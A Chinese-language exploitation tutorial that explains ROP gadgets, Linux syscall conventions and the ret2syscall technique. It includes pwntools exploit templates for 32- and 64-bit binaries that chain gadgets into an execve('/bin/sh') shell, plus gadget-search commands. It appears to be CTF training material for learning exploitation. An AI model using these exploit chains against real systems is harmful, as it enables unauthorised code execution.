## 一、ROP（Return Oriented Programming）

### 1.1 什么是 ROP

**ROP** 英文全拼：**Return Oriented Programming**，即返回导向编程。

光听名字感觉很高大上，实际上这是一种非常简单、常用的漏洞利用手段。并且前面讲到的修改返回地址其实是一种最简单的 ROP 技术。

ROP 是在栈溢出的基础上提出的。由于现代编译器的漏洞缓解策略，传统的栈溢出漏洞利用手段对系统造不成太大的影响，特别是 **NX 保护的开启**，限制了攻击者不能随心所欲修改程序控制流。

于是有人提出一种对抗 NX 的方法：我们可以利用程序中已有的一些指令片段来完成特定功能。简单来说，其原理就是 **"借刀杀人"**，而这把刀还是程序自己借给我们的。

### 1.2 为什么叫 ROP

之所以称为 ROP，是因为在这种攻击手段中，会使用程序自带的一系列以 **`ret`** 指令结尾的指令片段。由于 `ret` 指令代表"返回"，所以称之为返回导向的"编程"。而这些可以被利用的指令片段叫做 **gadget（小工具）**。

### 1.3 ROP 链原理

理论比较抽象，用图来理解：

```
栈布局（已开启 NX）：

┌──────────────────────┐
│                      │
├──────────────────────┤
│        ebp           │
├──────────────────────┤
│    ret address 1     │ ──→ 程序中的一段以 ret 结尾的指令 (gadget 1)
├──────────────────────┤                          │
│    ret address 2     │ ←─────────────────────────┘ (gadget 1 的 ret 跳转过来)
├──────────────────────┤                          │
│    ret address 3     │ ──→ 程序中的一段以 ret 结尾的指令 (gadget 2)
└──────────────────────┘                          │
                                                  │ (gadget 2 的 ret 跳转过来)
                                                  ▼
                                         程序中的一段以 ret 结尾的指令 (gadget 3)
```

**核心思想**：

1. 通过栈溢出，在栈上布置一系列 gadget 的地址
    
2. 函数返回时，`ret` 弹出第一个 gadget 地址并跳转执行
    
3. gadget 执行完毕后，其末尾的 `ret` 指令又会弹出下一个 gadget 地址
    
4. 如此链式执行，形成 **ROP chain（ROP 链）**
    

> 每个 gadget 都以 `ret` 结尾，`ret` 的本质是 `pop eip`（32 位）或 `pop rip`（64 位），即从栈顶弹出一个地址并跳转。通过精心构造栈上的地址序列，就能让程序按我们设计的顺序执行一系列小操作，最终组合成我们想要的功能。

### 1.4 查找 Gadget 的工具

|工具|命令示例|
|---|---|
|**ROPgadget**|`ROPgadget --binary target --only "pop\|ret"`|
|**ropper**|`ropper --file target --search "pop rdi; ret"`|

## 二、系统调用（Syscall）

### 2.1 什么是系统调用

内核会提供给用户空间程序与内核空间进行交互的一套标准接口，这些接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等。用户空间发生请求，内核空间负责执行，这些接口便是用户空间和内核空间共同识别的桥梁。

**syscall（系统调用，system call）** 就是连接用户态和内核态的桥梁。Linux 系统中，用户空间通过向内核空间发出 Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。

而对于每个系统调用都会有一个对应的**系统调用号**。系统调用提供用户程序与操作系统间的接口，部分库函数（如 `scanf`、`puts` 等 IO 相关的函数）实际上是对系统调用的封装（`read` 和 `write`）。

### 2.2 系统调用号查询

系统调用号定义在以下头文件中：

```
/usr/include/x86_64-linux-gnu/asm/unistd_64.h   # 64 位系统调用号
/usr/include/x86_64-linux-gnu/asm/unistd_32.h   # 32 位系统调用号
```

在线参考：

- Linux Syscall64 Reference: [https://syscalls64.paolostivanin.com/](https://syscalls64.paolostivanin.com/)
    
- [https://www.cnblogs.com/tcctw/p/11450449.html](https://www.cnblogs.com/tcctw/p/11450449.html)
    

### 2.3 触发方式

|架构|触发指令|
|---|---|
|32 位|`int 0x80`|
|64 位|`syscall`|

## 三、ret2syscall

### 3.1 系统调用的参数传递

与之前所说的函数调用约定传参不同，系统调用进行参数传递都是使用的**寄存器**（前几个参数）。这一点在 32 位架构上尤其需要区分。

#### 32 位系统调用

传入参数的顺序是：

```
ebx, ecx, edx, esi, edi
```

其中 **eax** 存放系统调用号。

#### 64 位系统调用

传入参数的顺序是：

```
rdi, rsi, rdx, r10, r8, r9
```

其中 **rax** 存放系统调用号。

### 3.2 execve 系统调用示例（32 位）

`execve` 函数实际调用的就是 `sys_execve`，是一个系统调用。

32 位下它的寄存器传参情况如下，将寄存器调整为：

|寄存器|值|含义|
|---|---|---|
|`eax`|`0xb`（即 11）|sys_execve 的系统调用号|
|`ebx`|`/bin/sh` 的地址|第一个参数：程序路径|
|`ecx`|`0`|第二个参数：argv（NULL）|
|`edx`|`0`|第三个参数：envp（NULL）|

调用 `int 0x80` 即可获得一个 shell。

### 3.3 什么是 ret2syscall

所谓 **ret2syscall**，就是指通过各种 gadget 来控制寄存器，最后跳转到系统调用的触发汇编上来调用对应的 syscall，从而达成想要实现的目的。

查询 gadget 的方法仍选择使用 **ropper** 或者 **ROPgadget**。

### 3.4 适用场景

一般使用 ret2syscall 的场景是**静态编译程序**，因为在静态编译的程序中，用到的库函数在最底层都是对 syscall 的封装，所以一定会有触发系统调用的 gadget 供我们选择使用。

### 3.5 攻击流程

```
─────────────────────────────────────────────────────────┐
│                    ret2syscall 攻击流程                    │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. 栈溢出覆盖返回地址                                     │
│         │                                               │
│         ▼                                               │
│  2. ROP 链：gadget 控制 eax = 0xb（sys_execve）           │
│         │                                               │
│         ▼                                               │
│  3. ROP 链：gadget 控制 ebx = "/bin/sh" 地址              │
│         │                                               │
│         ▼                                               │
│  4. ROP 链：gadget 控制 ecx = 0, edx = 0                 │
│         │                                               │
│         ▼                                               │
│  5. ROP 链：跳转到 int 0x80（32位）或 syscall（64位）       │
│         │                                               │
│         ▼                                               │
│  6. 获得 shell                                            │
│                                                         │
─────────────────────────────────────────────────────────┘
```

### 3.6 32 位 ret2syscall 示例 EXP

```
from pwn import *

s = process("./ret2syscall")
context.arch = "i386"

# 查找到的 gadget 地址（需要根据实际二进制文件确定）
pop_eax_ret = 0xXXXXXXXX    # pop eax; ret
pop_ebx_ret = 0xXXXXXXXX    # pop ebx; ret
pop_ecx_ret = 0xXXXXXXXX    # pop ecx; ret
pop_edx_ret = 0xXXXXXXXX    # pop edx; ret
int_0x80    = 0xXXXXXXXX    # int 0x80

# "/bin/sh" 字符串地址（需要在程序中找到或写入）
bin_sh_addr = 0xXXXXXXXX

payload = b'A' * offset  # 填充到返回地址
payload += p32(pop_eax_ret) + p32(0xb)          # eax = 0xb (sys_execve)
payload += p32(pop_ebx_ret) + p32(bin_sh_addr)  # ebx = "/bin/sh"
payload += p32(pop_ecx_ret) + p32(0)            # ecx = 0
payload += p32(pop_edx_ret) + p32(0)            # edx = 0
payload += p32(int_0x80)                        # 触发系统调用

s.sendline(payload)
s.interactive()
```

### 3.7 64 位 ret2syscall 示例 EXP

```
from pwn import *

s = process("./ret2syscall_64")
context.arch = "amd64"

# 64 位常用 gadget
pop_rax_ret   = 0xXXXXXXXX    # pop rax; ret
pop_rdi_ret   = 0xXXXXXXXX    # pop rdi; ret
pop_rsi_ret   = 0xXXXXXXXX    # pop rsi; ret
pop_rdx_ret   = 0xXXXXXXXX    # pop rdx; ret
syscall_ret   = 0xXXXXXXXX    # syscall; ret

bin_sh_addr = 0xXXXXXXXX

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(0x3b)         # rax = 0x3b (59, sys_execve)
payload += p64(pop_rdi_ret) + p64(bin_sh_addr)  # rdi = "/bin/sh"
payload += p64(pop_rsi_ret) + p64(0)            # rsi = 0
payload += p64(pop_rdx_ret) + p64(0)            # rdx = 0
payload += p64(syscall_ret)                     # 触发系统调用

s.sendline(payload)
s.interactive()
```

## 四、32 位 vs 64 位对比总结

### 4.1 系统调用对比

|对比项|32 位|64 位|
|---|---|---|
|触发指令|`int 0x80`|`syscall`|
|系统调用号寄存器|`eax`|`rax`|
|execve 调用号|`0xb`（11）|`0x3b`（59）|
|第 1 个参数|`ebx`|`rdi`|
|第 2 个参数|`ecx`|`rsi`|
|第 3 个参数|`edx`|`rdx`|
|第 4 个参数|`esi`|`r10`|
|第 5 个参数|`edi`|`r8`|
|第 6 个参数|—|`r9`|

### 4.2 攻击手法对比

|攻击手法|NX|PIE|适用场景|
|---|---|---|---|
|ret2text|不限|未开启|程序自带 system/execve|
|ret2shellcode|未开启|不限|栈可执行|
|ret2syscall|开启|未开启|静态编译程序，有 syscall gadget|
|ret2libc|开启|未开启|动态链接程序，利用 libc|

## 五、关键概念速查

|概念|说明|
|---|---|
|**Gadget**|程序中以 `ret` 结尾的短指令片段，是 ROP 的基本单元|
|**ROP Chain**|由多个 gadget 地址串联而成的攻击链|
|**NX**|No-eXecute，栈/数据段不可执行保护|
|**PIE**|Position Independent Executable，地址随机化|
|**Canary**|栈溢出检测值，位于 ebp 上方|
|**syscall**|用户态与内核态交互的桥梁|
|**系统调用号**|每个 syscall 对应的唯一编号，放在 eax/rax 中|

## 六、常用工具命令

```
# 检查保护机制
checksec ./binary

# 查找 gadget（ROPgadget）
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --only "int"

# 查找 gadget（ropper）
ropper --file ./binary --search "pop rdi"
ropper --file ./binary --search "syscall"

# 查找特定指令
ROPgadget --binary ./binary --string "/bin/sh"
```

# Pwntools 常用
from pwn import *

context.arch = "i386"    # 32 位
context.arch = "amd64"   # 64 位

# ROP 自动化构造
elf = ELF("./binary")
rop = ROP(elf)
rop.call(elf.sym['system'], [next(elf.search(b'/bin/sh'))])
print(rop.dump())
